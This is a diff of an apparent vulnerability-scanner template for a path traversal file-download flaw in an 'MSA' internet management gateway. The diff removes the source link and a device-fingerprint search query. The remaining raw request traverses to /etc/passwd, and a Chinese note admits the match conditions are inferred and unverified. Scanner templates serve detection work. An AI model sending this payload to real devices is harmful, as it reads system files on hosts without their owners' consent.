@@ -3,14 +3,8 @@ info:
   name: MSA互联网管理网关msa任意文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0de6d39f9e75db41e2303bb3b6ce1785
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 0de6d39f9e75db41e2303bb3b6ce1785
-    fofa: + hunter`web.icon=="73043af39b293ade8de257c2370de7bd"`
 http:
 - raw:
   - 'GET /msa/../../../../etc/passwd HTTP/1.1
